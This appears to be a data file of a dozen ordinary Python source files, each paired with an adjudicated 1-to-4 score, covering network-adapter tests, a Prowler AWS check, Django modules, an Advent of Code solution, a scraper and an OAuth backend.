358	adjudicated	1	"# Copyright 2017-present Adtran, Inc.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>from voltha.adapters.adtran_onu.pon_port import PonPort<<NEWL>>from mock import MagicMock<<NEWL>>import pytest<<NEWL>><<NEWL>>## Test class PonPort init settings  ###############<<NEWL>>def test_PonPort_inits():<<NEWL>>    handler = MagicMock()<<NEWL>>    handler.device_id = 100<<NEWL>>    portnum = 1<<NEWL>>    testponport = PonPort(handler, portnum)<<NEWL>><<NEWL>>    assert testponport._enabled is False<<NEWL>>    assert testponport._valid is True<<NEWL>>    assert testponport._handler is handler<<NEWL>>    assert testponport._deferred is None<<NEWL>>    assert testponport._port is None<<NEWL>>    assert testponport._port_number == 1<<NEWL>>    assert testponport._entity_id is None<<NEWL>>    assert testponport._next_entity_id == PonPort.MIN_GEM_ENTITY_ID<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>## Test PonPort staticmethod #########<<NEWL>>def test_create():<<NEWL>>    handler = MagicMock()<<NEWL>>    handler.device_id = 200<<NEWL>>    port_no = 2<<NEWL>>    testcreate = PonPort.create(handler, port_no)<<NEWL>><<NEWL>>    assert isinstance(testcreate, PonPort)<<NEWL>>    assert testcreate._handler is handler<<NEWL>>    assert testcreate._port_number is port_no<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>## Test PonPort @property #########<<NEWL>>def test_PonPort_properties():<<NEWL>>    handler = MagicMock()<<NEWL>>    handler.device_id = 300<<NEWL>>    port_no = 3<<NEWL>>    testprop1 = PonPort(handler, port_no)<<NEWL>><<NEWL>>    assert testprop1.enabled is False<<NEWL>>    assert testprop1.port_number == 3<<NEWL>>    assert testprop1.entity_id is None<<NEWL>>    assert testprop1.next_gem_entity_id == PonPort.MIN_GEM_ENTITY_ID<<NEWL>>    assert testprop1.tconts == {}<<NEWL>>    assert testprop1.gem_ports == {}<<NEWL>><<NEWL>>"
249	adjudicated	1	"from prowler.lib.check.models import Check, Check_Report_AWS<<NEWL>>from prowler.providers.aws.services.directoryservice.directoryservice_client import (<<NEWL>>    directoryservice_client,<<NEWL>>)<<NEWL>><<NEWL>>SNAPSHOT_LIMIT_THRESHOLD = 2<<NEWL>>""""""Number of remaining snapshots to reach the limit""""""<<NEWL>><<NEWL>><<NEWL>>class directoryservice_directory_snapshots_limit(Check):<<NEWL>>    def execute(self):<<NEWL>>        findings = []<<NEWL>>        for directory in directoryservice_client.directories.values():<<NEWL>>            report = Check_Report_AWS(self.metadata())<<NEWL>>            report.region = directory.region<<NEWL>>            report.resource_id = directory.id<<NEWL>>            if directory.snapshots_limits:<<NEWL>>                if directory.snapshots_limits.manual_snapshots_limit_reached:<<NEWL>>                    report.status = ""FAIL""<<NEWL>>                    report.status_extended = f""Directory Service {directory.id} reached {directory.snapshots_limits.manual_snapshots_limit} Snapshots limit""<<NEWL>>                else:<<NEWL>>                    limit_remaining = (<<NEWL>>                        directory.snapshots_limits.manual_snapshots_limit<<NEWL>>                        - directory.snapshots_limits.manual_snapshots_current_count<<NEWL>>                    )<<NEWL>>                    if limit_remaining <= SNAPSHOT_LIMIT_THRESHOLD:<<NEWL>>                        report.status = ""FAIL""<<NEWL>>                        report.status_extended = f""Directory Service {directory.id} is about to reach {directory.snapshots_limits.manual_snapshots_limit} Snapshots which is the limit""<<NEWL>>                    else:<<NEWL>>                        report.status = ""PASS""<<NEWL>>                        report.status_extended = f""Directory Service {directory.id} is using {directory.snapshots_limits.manual_snapshots_current_count} out of {directory.snapshots_limits.manual_snapshots_limit} from the Snapshots Limit""<<NEWL>>                findings.append(report)<<NEWL>><<NEWL>>        return findings"
309	adjudicated	3	"from datetime import datetime<<NEWL>>from .virtualtimescheduler import VirtualTimeScheduler<<NEWL>><<NEWL>><<NEWL>>class HistoricalScheduler(VirtualTimeScheduler):<<NEWL>>    """"""Provides a virtual time scheduler that uses datetime for absolute time<<NEWL>>    and timedelta for relative time.""""""<<NEWL>><<NEWL>>    def __init__(self, initial_clock=None, comparer=None):<<NEWL>>        """"""Creates a new historical scheduler with the specified initial clock<<NEWL>>        value.<<NEWL>><<NEWL>>        Keyword arguments:<<NEWL>>        initial_clock -- {Number} Initial value for the clock.<<NEWL>>        comparer -- {Function} Comparer to determine causality of events based<<NEWL>>            on absolute time.""""""<<NEWL>><<NEWL>>        def compare_datetimes(a, b):<<NEWL>>            return (a > b) - (a < b)<<NEWL>><<NEWL>>        clock = initial_clock or datetime.fromtimestamp(0)<<NEWL>>        comparer = comparer or compare_datetimes<<NEWL>><<NEWL>>        super(HistoricalScheduler, self).__init__(clock)<<NEWL>><<NEWL>>    @property<<NEWL>>    def now(self):<<NEWL>>        """"""Represents a notion of time for this scheduler. Tasks being scheduled<<NEWL>>        on a scheduler will adhere to the time denoted by this property.""""""<<NEWL>><<NEWL>>        return self.clock<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def add(absolute, relative):<<NEWL>>        """"""Adds a relative time value to an absolute time value.<<NEWL>><<NEWL>>        Keyword arguments:<<NEWL>>        absolute -- {datetime} Absolute virtual time value.<<NEWL>>        relative -- {timedelta} Relative virtual time value to add.<<NEWL>><<NEWL>>        Returns resulting absolute virtual time sum value.""""""<<NEWL>><<NEWL>>        return absolute + relative<<NEWL>><<NEWL>>    def to_datetime_offset(self, absolute):<<NEWL>>        """"""Converts the absolute time value to a datetime value.""""""<<NEWL>><<NEWL>>        # datetime -> datetime<<NEWL>>        return absolute<<NEWL>><<NEWL>>    def to_relative(self, timespan):<<NEWL>>        """"""Converts the timespan value to a relative virtual time value.<<NEWL>><<NEWL>>        Keyword arguments:<<NEWL>>        timespan -- {timedelta} Time_span value to convert.<<NEWL>><<NEWL>>        Returns corresponding relative virtual time value.""""""<<NEWL>><<NEWL>>        # timedelta -> timedelta<<NEWL>>        return timespan"
98	adjudicated	1	"# -*- coding: utf-8 -*-<<NEWL>><<NEWL>>""""""<<NEWL>>requests.compat<<NEWL>>~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>This module handles import compatibility issues between Python 2 and<<NEWL>>Python 3.<<NEWL>>""""""<<NEWL>><<NEWL>>import chardet<<NEWL>><<NEWL>>import sys<<NEWL>><<NEWL>># -------<<NEWL>># Pythons<<NEWL>># -------<<NEWL>><<NEWL>># Syntax sugar.<<NEWL>>_ver = sys.version_info<<NEWL>><<NEWL>>#: Python 2.x?<<NEWL>>is_py2 = (_ver[0] == 2)<<NEWL>><<NEWL>>#: Python 3.x?<<NEWL>>is_py3 = (_ver[0] == 3)<<NEWL>><<NEWL>>try:<<NEWL>>    import simplejson as json<<NEWL>>except ImportError:<<NEWL>>    import json<<NEWL>><<NEWL>># ---------<<NEWL>># Specifics<<NEWL>># ---------<<NEWL>><<NEWL>>if is_py2:<<NEWL>>    from urllib import (<<NEWL>>        quote, unquote, quote_plus, unquote_plus, urlencode, getproxies,<<NEWL>>        proxy_bypass, proxy_bypass_environment, getproxies_environment)<<NEWL>>    from urlparse import urlparse, urlunparse, urljoin, urlsplit, urldefrag<<NEWL>>    from urllib2 import parse_http_list<<NEWL>>    import cookielib<<NEWL>>    from Cookie import Morsel<<NEWL>>    from StringIO import StringIO<<NEWL>>    # Keep OrderedDict for backwards compatibility.<<NEWL>>    from collections import Callable, Mapping, MutableMapping, OrderedDict<<NEWL>><<NEWL>><<NEWL>>    builtin_str = str<<NEWL>>    bytes = str<<NEWL>>    str = unicode<<NEWL>>    basestring = basestring<<NEWL>>    numeric_types = (int, long, float)<<NEWL>>    integer_types = (int, long)<<NEWL>><<NEWL>>elif is_py3:<<NEWL>>    from urllib.parse import urlparse, urlunparse, urljoin, urlsplit, urlencode, quote, unquote, quote_plus, unquote_plus, urldefrag<<NEWL>>    from urllib.request import parse_http_list, getproxies, proxy_bypass, proxy_bypass_environment, getproxies_environment<<NEWL>>    from http import cookiejar as cookielib<<NEWL>>    from http.cookies import Morsel<<NEWL>>    from io import StringIO<<NEWL>>    # Keep OrderedDict for backwards compatibility.<<NEWL>>    from collections import OrderedDict<<NEWL>>    from collections.abc import Callable, Mapping, MutableMapping<<NEWL>><<NEWL>>    builtin_str = str<<NEWL>>    str = str<<NEWL>>    bytes = bytes<<NEWL>>    basestring = (str, bytes)<<NEWL>>    numeric_types = (int, float)<<NEWL>>    integer_types = (int,)"
88	adjudicated	3	"from MySQLdb.constants import FIELD_TYPE<<NEWL>><<NEWL>>from django.contrib.gis.gdal import OGRGeomType<<NEWL>>from django.db.backends.mysql.introspection import DatabaseIntrospection<<NEWL>><<NEWL>><<NEWL>>class MySQLIntrospection(DatabaseIntrospection):<<NEWL>>    # Updating the data_types_reverse dictionary with the appropriate<<NEWL>>    # type for Geometry fields.<<NEWL>>    data_types_reverse = DatabaseIntrospection.data_types_reverse.copy()<<NEWL>>    data_types_reverse[FIELD_TYPE.GEOMETRY] = ""GeometryField""<<NEWL>><<NEWL>>    def get_geometry_type(self, table_name, description):<<NEWL>>        with self.connection.cursor() as cursor:<<NEWL>>            # In order to get the specific geometry type of the field,<<NEWL>>            # we introspect on the table definition using `DESCRIBE`.<<NEWL>>            cursor.execute(""DESCRIBE %s"" % self.connection.ops.quote_name(table_name))<<NEWL>>            # Increment over description info until we get to the geometry<<NEWL>>            # column.<<NEWL>>            for column, typ, null, key, default, extra in cursor.fetchall():<<NEWL>>                if column == description.name:<<NEWL>>                    # Using OGRGeomType to convert from OGC name to Django field.<<NEWL>>                    # MySQL does not support 3D or SRIDs, so the field params<<NEWL>>                    # are empty.<<NEWL>>                    field_type = OGRGeomType(typ).django<<NEWL>>                    field_params = {}<<NEWL>>                    break<<NEWL>>        return field_type, field_params<<NEWL>><<NEWL>>    def supports_spatial_index(self, cursor, table_name):<<NEWL>>        # Supported with MyISAM/Aria, or InnoDB on MySQL 5.7.5+/MariaDB.<<NEWL>>        storage_engine = self.get_storage_engine(cursor, table_name)<<NEWL>>        if storage_engine == ""InnoDB"":<<NEWL>>            if self.connection.mysql_is_mariadb:<<NEWL>>                return True<<NEWL>>            return self.connection.mysql_version >= (5, 7, 5)<<NEWL>>        return storage_engine in (""MyISAM"", ""Aria"")"
319	adjudicated	1	"from django.contrib.sites.models import Site<<NEWL>>from django.db import models<<NEWL>>from django.urls import NoReverseMatch, get_script_prefix, reverse<<NEWL>>from django.utils.encoding import iri_to_uri<<NEWL>>from django.utils.translation import gettext_lazy as _<<NEWL>><<NEWL>><<NEWL>>class FlatPage(models.Model):<<NEWL>>    url = models.CharField(_(""URL""), max_length=100, db_index=True)<<NEWL>>    title = models.CharField(_(""title""), max_length=200)<<NEWL>>    content = models.TextField(_(""content""), blank=True)<<NEWL>>    enable_comments = models.BooleanField(_(""enable comments""), default=False)<<NEWL>>    template_name = models.CharField(<<NEWL>>        _(""template name""),<<NEWL>>        max_length=70,<<NEWL>>        blank=True,<<NEWL>>        help_text=_(<<NEWL>>            ""Example: âflatpages/contact_page.htmlâ. If this isnât provided, ""<<NEWL>>            ""the system will use âflatpages/default.htmlâ.""<<NEWL>>        ),<<NEWL>>    )<<NEWL>>    registration_required = models.BooleanField(<<NEWL>>        _(""registration required""),<<NEWL>>        help_text=_(<<NEWL>>            ""If this is checked, only logged-in users will be able to view the page.""<<NEWL>>        ),<<NEWL>>        default=False,<<NEWL>>    )<<NEWL>>    sites = models.ManyToManyField(Site, verbose_name=_(""sites""))<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        db_table = ""django_flatpage""<<NEWL>>        verbose_name = _(""flat page"")<<NEWL>>        verbose_name_plural = _(""flat pages"")<<NEWL>>        ordering = [""url""]<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return ""%s -- %s"" % (self.url, self.title)<<NEWL>><<NEWL>>    def get_absolute_url(self):<<NEWL>>        from .views import flatpage<<NEWL>><<NEWL>>        for url in (self.url.lstrip(""/""), self.url):<<NEWL>>            try:<<NEWL>>                return reverse(flatpage, kwargs={""url"": url})<<NEWL>>            except NoReverseMatch:<<NEWL>>                pass<<NEWL>>        # Handle script prefix manually because we bypass reverse()<<NEWL>>        return iri_to_uri(get_script_prefix().rstrip(""/"") + self.url)"
259	adjudicated	4	"""""""tst_tc1357_uxusylnz_68580 URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/2.2/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import path, include, re_path<<NEWL>>from django.views.generic.base import TemplateView<<NEWL>>from allauth.account.views import confirm_email<<NEWL>>from rest_framework import permissions<<NEWL>>from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    <<NEWL>>    path(""accounts/"", include(""allauth.urls"")),<<NEWL>>    path(""modules/"", include(""modules.urls"")),<<NEWL>>    path(""api/v1/"", include(""home.api.v1.urls"")),<<NEWL>>    path(""admin/"", admin.site.urls),<<NEWL>>    path(""users/"", include(""users.urls"", namespace=""users"")),<<NEWL>>    path(""rest-auth/"", include(""rest_auth.urls"")),<<NEWL>>    # Override email confirm to use allauth's HTML view instead of rest_auth's API view<<NEWL>>    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),<<NEWL>>    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),<<NEWL>>]<<NEWL>><<NEWL>>admin.site.site_header = ""TST-TC1357-uxusylnzzz""<<NEWL>>admin.site.site_title = ""TST-TC1357-uxusylnzzz Admin Portal""<<NEWL>>admin.site.index_title = ""TST-TC1357-uxusylnzzz Admin""<<NEWL>><<NEWL>># swagger<<NEWL>>urlpatterns += [<<NEWL>>    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),<<NEWL>>    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
348	adjudicated	3	"""""""<<NEWL>>https://adventofcode.com/2016/day/15<<NEWL>>""""""<<NEWL>>from utils import extract_ints, read_data<<NEWL>><<NEWL>>USE_TEST_DATA = False<<NEWL>>SPLIT_BY_LINE = True<<NEWL>>data = read_data(USE_TEST_DATA, SPLIT_BY_LINE)<<NEWL>><<NEWL>><<NEWL>>def parse_data(data_in):<<NEWL>>    """""" Read the input data to retrieve the disc positions """"""<<NEWL>>    num_positions = []<<NEWL>>    starting_pos = []<<NEWL>><<NEWL>>    for line in data_in:<<NEWL>>        ints = extract_ints(line)<<NEWL>>        num_positions.append(ints[1])<<NEWL>>        starting_pos.append(ints[3])<<NEWL>><<NEWL>>    return num_positions, starting_pos<<NEWL>><<NEWL>><<NEWL>>def is_at_zero(num_positions, starting_pos, disc_index, time):<<NEWL>>    """""" Is the specified disc at the zero position at the given time? """"""<<NEWL>>    pos = (starting_pos[disc_index] + time) % num_positions[disc_index]<<NEWL>>    return pos == 0<<NEWL>><<NEWL>><<NEWL>>def find_time(num_positions, starting_pos):<<NEWL>>    """"""<<NEWL>>    Find the time at which to release a capsule so that it passes through all<<NEWL>>    discs successfully<<NEWL>>    """"""<<NEWL>><<NEWL>>    # What's the first time that we can release the disc where it reaches the<<NEWL>>    # first disc as it's at position 0?<<NEWL>>    candidate_time = num_positions[0] - starting_pos[0] - 1<<NEWL>><<NEWL>>    while True:<<NEWL>>        # Are all discs at position 0 when the capsule reaches them?<<NEWL>>        collision = False<<NEWL>>        for disc_index in range(len(num_positions)):<<NEWL>>            time_capsule_reaches_disc = candidate_time + disc_index + 1<<NEWL>>            if not is_at_zero(num_positions, starting_pos, disc_index, time_capsule_reaches_disc):<<NEWL>>                collision = True<<NEWL>>                break<<NEWL>><<NEWL>>        # There was no collision with any disc! candidate_time is the correct answer!<<NEWL>>        if not collision:<<NEWL>>            return candidate_time<<NEWL>><<NEWL>>        # There was a collision so candidate_time isn't a valid result.<<NEWL>>        # Increment it to the next time that disc 1 (index 0) is at the zero position.<<NEWL>>        candidate_time += num_positions[0]<<NEWL>><<NEWL>><<NEWL>>positions, starting = parse_data(data)<<NEWL>><<NEWL>># Part 1<<NEWL>># At what time can we release the capsule to pass through all of the discs?<<NEWL>>print(find_time(positions, starting))<<NEWL>><<NEWL>># Part 2<<NEWL>># What if we add another disc at the bottom?<<NEWL>>positions.append(11)<<NEWL>>starting.append(0)<<NEWL>>print(find_time(positions, starting))"
199	adjudicated	1	"# image_uri extractor<<NEWL>>import requests<<NEWL>>from bs4 import BeautifulSoup<<NEWL>>import time<<NEWL>><<NEWL>>import json<<NEWL>><<NEWL>>api_url = 'http://127.0.0.1:3000/items'<<NEWL>><<NEWL>># Get the current list of daily items from the API<<NEWL>>response = requests.get(api_url)<<NEWL>>items = response.json()<<NEWL>><<NEWL>>updated_count = 0<<NEWL>>skipped_count = 0<<NEWL>><<NEWL>>last_attempted_item = 0<<NEWL>><<NEWL>># Go through each item and update the image URI<<NEWL>>for item in items:<<NEWL>>    if item['id'] < 57722:<<NEWL>>        continue<<NEWL>>    if last_attempted_item is not None and item['id'] < last_attempted_item:<<NEWL>>        continue<<NEWL>>    if item['valid_status'] is True:<<NEWL>>        skipped_count += 1<<NEWL>>        continue<<NEWL>>    while True:<<NEWL>>        try:<<NEWL>>            search_url = f""https://rl.insider.gg/en/pc/search?q={item['name'].replace(' ', '+')}""<<NEWL>>            search_response = requests.get(search_url)<<NEWL>>            search_html = search_response.text<<NEWL>>            search_soup = BeautifulSoup(search_html, 'html.parser')<<NEWL>>            search_items = search_soup.find_all('div', class_='item')<<NEWL>>            for search_item in search_items:<<NEWL>>                if search_item.find('span', class_='itemName').text.lower() == item['name'].lower():<<NEWL>>                    img_uri = search_item['data-uri']<<NEWL>>                    if ""import/import"" in img_uri:<<NEWL>>                        img_uri = img_uri.replace(""import/import"", ""import"")<<NEWL>>                    item['image_uri'] = img_uri<<NEWL>>                    patch_response = requests.patch(api_url+'/'+str(item['id']), json={'image_uri': img_uri})<<NEWL>>                    print(f""{item['id']} Image URI updated"")<<NEWL>>                    updated_count += 1<<NEWL>>                    break<<NEWL>>            else:<<NEWL>>                print(f""{item['id']} No image URI found"")<<NEWL>>                skipped_count += 1<<NEWL>>            last_attempted_item = item['id']<<NEWL>>            break<<NEWL>>        except Exception as e:<<NEWL>>            print(f""Error updating item {item['id']}: {e}"")<<NEWL>>            print(f""Retrying in 5 minutes..."")<<NEWL>>            time.sleep(5 * 60)<<NEWL>>            continue<<NEWL>><<NEWL>>print(f""Updated {updated_count} items"")<<NEWL>>print(f""Skipped {skipped_count} items"")"
208	adjudicated	4	"""""""tst_tc751_ckuayzoqs_68554 URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/2.2/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>><<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import path, include, re_path<<NEWL>>from django.views.generic.base import TemplateView<<NEWL>>from allauth.account.views import confirm_email<<NEWL>>from rest_framework import permissions<<NEWL>>from drf_spectacular.views import SpectacularJSONAPIView, SpectacularSwaggerView<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    <<NEWL>>    path(""accounts/"", include(""allauth.urls"")),<<NEWL>>    path(""modules/"", include(""modules.urls"")),<<NEWL>>    path(""api/v1/"", include(""home.api.v1.urls"")),<<NEWL>>    path(""admin/"", admin.site.urls),<<NEWL>>    path(""users/"", include(""users.urls"", namespace=""users"")),<<NEWL>>    path(""rest-auth/"", include(""rest_auth.urls"")),<<NEWL>>    # Override email confirm to use allauth's HTML view instead of rest_auth's API view<<NEWL>>    path(""rest-auth/registration/account-confirm-email/<str:key>/"", confirm_email),<<NEWL>>    path(""rest-auth/registration/"", include(""rest_auth.registration.urls"")),<<NEWL>>]<<NEWL>><<NEWL>>admin.site.site_header = ""TST-TC751-ckuayzoqsc""<<NEWL>>admin.site.site_title = ""TST-TC751-ckuayzoqsc Admin Portal""<<NEWL>>admin.site.index_title = ""TST-TC751-ckuayzoqsc Admin""<<NEWL>><<NEWL>># swagger<<NEWL>>urlpatterns += [<<NEWL>>    path(""api-docs/schema/"", SpectacularJSONAPIView.as_view(), name=""schema""),<<NEWL>>    path(""api-docs/"", SpectacularSwaggerView.as_view(url_name='schema'), name=""api_docs"")<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>urlpatterns += [re_path(r"".*"",TemplateView.as_view(template_name='index.html'))]"
406	adjudicated	2	"""""""<<NEWL>>This module deals with interpreting the parse tree as Python<<NEWL>>would have done, in the compiler.<<NEWL>><<NEWL>>For now this only covers parse tree to value conversion of<<NEWL>>compile-time values.<<NEWL>>""""""<<NEWL>><<NEWL>>from __future__ import absolute_import<<NEWL>><<NEWL>>from .Nodes import *<<NEWL>>from .ExprNodes import *<<NEWL>>from .Errors import CompileError<<NEWL>><<NEWL>><<NEWL>>class EmptyScope(object):<<NEWL>>    def lookup(self, name):<<NEWL>>        return None<<NEWL>><<NEWL>>empty_scope = EmptyScope()<<NEWL>><<NEWL>>def interpret_compiletime_options(optlist, optdict, type_env=None, type_args=()):<<NEWL>>    """"""<<NEWL>>    Tries to interpret a list of compile time option nodes.<<NEWL>>    The result will be a tuple (optlist, optdict) but where<<NEWL>>    all expression nodes have been interpreted. The result is<<NEWL>>    in the form of tuples (value, pos).<<NEWL>><<NEWL>>    optlist is a list of nodes, while optdict is a DictNode (the<<NEWL>>    result optdict is a dict)<<NEWL>><<NEWL>>    If type_env is set, all type nodes will be analysed and the resulting<<NEWL>>    type set. Otherwise only interpretateable ExprNodes<<NEWL>>    are allowed, other nodes raises errors.<<NEWL>><<NEWL>>    A CompileError will be raised if there are problems.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def interpret(node, ix):<<NEWL>>        if ix in type_args:<<NEWL>>            if type_env:<<NEWL>>                type = node.analyse_as_type(type_env)<<NEWL>>                if not type:<<NEWL>>                    raise CompileError(node.pos, ""Invalid type."")<<NEWL>>                return (type, node.pos)<<NEWL>>            else:<<NEWL>>                raise CompileError(node.pos, ""Type not allowed here."")<<NEWL>>        else:<<NEWL>>            if (sys.version_info[0] >=3 and<<NEWL>>                isinstance(node, StringNode) and<<NEWL>>                node.unicode_value is not None):<<NEWL>>                return (node.unicode_value, node.pos)<<NEWL>>            return (node.compile_time_value(empty_scope), node.pos)<<NEWL>><<NEWL>>    if optlist:<<NEWL>>        optlist = [interpret(x, ix) for ix, x in enumerate(optlist)]<<NEWL>>    if optdict:<<NEWL>>        assert isinstance(optdict, DictNode)<<NEWL>>        new_optdict = {}<<NEWL>>        for item in optdict.key_value_pairs:<<NEWL>>            new_key, dummy = interpret(item.key, None)<<NEWL>>            new_optdict[new_key] = interpret(item.value, item.key.value)<<NEWL>>        optdict = new_optdict<<NEWL>>    return (optlist, new_optdict)"
457	adjudicated	4	"""""""<<NEWL>>String utility functions.<<NEWL>>""""""<<NEWL>><<NEWL>>from typing import Any, Optional, Union<<NEWL>><<NEWL>><<NEWL>>def safe_repr(obj: Any, clip: Optional[int] = None) -> str:<<NEWL>>    """"""<<NEWL>>    Convert object to string representation, yielding the same result a `repr`<<NEWL>>    but catches all exceptions and returns 'N/A' instead of raising the<<NEWL>>    exception. Strings may be truncated by providing `clip`.<<NEWL>><<NEWL>>    >>> safe_repr(42)<<NEWL>>    '42'<<NEWL>>    >>> safe_repr('Clipped text', clip=8)<<NEWL>>    'Clip..xt'<<NEWL>>    >>> safe_repr([1,2,3,4], clip=8)<<NEWL>>    '[1,2..4]'<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        s = repr(obj)<<NEWL>>        if not clip or len(s) <= clip:<<NEWL>>            return s<<NEWL>>        else:<<NEWL>>            return s[:clip - 4] + '..' + s[-2:]<<NEWL>>    except:<<NEWL>>        return 'N/A'<<NEWL>><<NEWL>><<NEWL>>def trunc(obj: str, max: int, left: bool = False) -> str:<<NEWL>>    """"""<<NEWL>>    Convert `obj` to string, eliminate newlines and truncate the string to<<NEWL>>    `max` characters. If there are more characters in the string add ``...`` to<<NEWL>>    the string. With `left=True`, the string can be truncated at the beginning.<<NEWL>><<NEWL>>    @note: Does not catch exceptions when converting `obj` to string with<<NEWL>>        `str`.<<NEWL>><<NEWL>>    >>> trunc('This is a long text.', 8)<<NEWL>>    This ...<<NEWL>>    >>> trunc('This is a long text.', 8, left=True)<<NEWL>>    ...text.<<NEWL>>    """"""<<NEWL>>    s = str(obj)<<NEWL>>    s = s.replace('\n', '|')<<NEWL>>    if len(s) > max:<<NEWL>>        if left:<<NEWL>>            return '...' + s[len(s) - max + 3:]<<NEWL>>        else:<<NEWL>>            return s[:(max - 3)] + '...'<<NEWL>>    else:<<NEWL>>        return s<<NEWL>><<NEWL>><<NEWL>>def pp(i: Union[int, float], base: int = 1024) -> str:<<NEWL>>    """"""<<NEWL>>    Pretty-print the integer `i` as a human-readable size representation.<<NEWL>>    """"""<<NEWL>>    degree = 0<<NEWL>>    pattern = ""%4d     %s""<<NEWL>>    while i > base:<<NEWL>>        pattern = ""%7.2f %s""<<NEWL>>        i = i / float(base)<<NEWL>>        degree += 1<<NEWL>>    scales = ['B', 'KB', 'MB', 'GB', 'TB', 'EB']<<NEWL>>    return pattern % (i, scales[degree])<<NEWL>><<NEWL>><<NEWL>>def pp_timestamp(t: Optional[float]) -> str:<<NEWL>>    """"""<<NEWL>>    Get a friendly timestamp represented as a string.<<NEWL>>    """"""<<NEWL>>    if t is None:<<NEWL>>        return ''<<NEWL>>    h, m, s = int(t / 3600), int(t / 60 % 60), t % 60<<NEWL>>    return ""%02d:%02d:%05.2f"" % (h, m, s)"
517	adjudicated	4	"""""""<<NEWL>>Kakao OAuth2 backend, docs at:<<NEWL>>    https://python-social-auth.readthedocs.io/en/latest/backends/kakao.html<<NEWL>>""""""<<NEWL>>from .oauth import BaseOAuth2<<NEWL>><<NEWL>><<NEWL>>class KakaoOAuth2(BaseOAuth2):<<NEWL>>    """"""Kakao OAuth authentication backend""""""<<NEWL>>    name = 'kakao'<<NEWL>>    AUTHORIZATION_URL = 'https://kauth.kakao.com/oauth/authorize'<<NEWL>>    ACCESS_TOKEN_URL = 'https://kauth.kakao.com/oauth/token'<<NEWL>>    ACCESS_TOKEN_METHOD = 'POST'<<NEWL>>    REDIRECT_STATE = False<<NEWL>>    EXTRA_DATA = [<<NEWL>>        ('properties', 'properties'),<<NEWL>>    ]<<NEWL>><<NEWL>>    def get_user_id(self, details, response):<<NEWL>>        return response['id']<<NEWL>><<NEWL>>    def get_user_details(self, response):<<NEWL>>        """"""Return user details from Kakao account""""""<<NEWL>><<NEWL>>        kakao_account = response.get('kakao_account', '')<<NEWL>>        kaccount_email = kakao_account.get('email', '')<<NEWL>>        properties = response.get('properties', '')<<NEWL>>        nickname = properties.get('nickname') if properties else ''<<NEWL>>        return {<<NEWL>>            'username': nickname,<<NEWL>>            'email': kaccount_email,<<NEWL>>            'fullname': nickname,<<NEWL>>            'first_name': nickname[1:] if nickname else '',<<NEWL>>            'last_name': nickname[0] if nickname else '',<<NEWL>>        }<<NEWL>><<NEWL>>    def user_data(self, access_token, *args, **kwargs):<<NEWL>>        """"""Loads user data from service""""""<<NEWL>>        return self.get_json(<<NEWL>>            'https://kapi.kakao.com/v2/user/me',<<NEWL>>            headers={<<NEWL>>                'Authorization': f'Bearer {access_token}',<<NEWL>>                'Content_Type': 'application/x-www-form-urlencoded;charset=utf-8',<<NEWL>>            },<<NEWL>>            params={'access_token': access_token}<<NEWL>>        )<<NEWL>><<NEWL>>    def auth_complete_params(self, state=None):<<NEWL>>        client_id, client_secret = self.get_key_and_secret()<<NEWL>>        return {<<NEWL>>            'grant_type': 'authorization_code',<<NEWL>>            'code': self.data.get('code', ''),<<NEWL>>            'client_id': client_id,<<NEWL>>            'client_secret': client_secret,<<NEWL>>        }"
